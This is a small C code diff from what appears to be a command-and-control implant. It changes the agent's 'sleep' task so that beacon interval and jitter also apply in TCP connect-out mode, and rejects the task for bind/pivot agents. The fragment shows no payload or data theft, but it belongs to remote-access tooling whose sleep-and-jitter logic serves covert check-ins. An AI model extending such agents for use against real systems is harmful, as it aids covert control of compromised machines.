@@ -1268,14 +1268,15 @@ uint8_t nax_dispatch(NaxAgent *a, NaxTask *t,
     }
 }
 
-/* ===== sleep — set sleep interval (HTTPS only) ===== */
+/* ===== sleep — set sleep interval (HTTPS and TCP connect-out) ===== */
 /* Args: [sleep_ms(4 LE)][jitter_pct(1)]  — 5 bytes
  * Result: [sleep_ms(4 LE)][jitter_pct(1)]["sleep=Xs jitter=Y%"] */
 uint8_t nax_cmd_sleep(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
 {
-#ifndef NAX_HTTPS_MODE
+#ifdef NAX_TCP_MODE_BIND
+    /* Bind/pivot agents are event-driven by parent — sleep not applicable */
     (void)a; (void)t;
-    const char *msg = "sleep: only available in HTTPS mode";
+    const char *msg = "sleep: only available in HTTPS and TCP connect-out mode";
     *out = (uint8_t *)strdup(msg);
     *out_len = (uint32_t)strlen(msg);
     return NAX_STATUS_ERR;
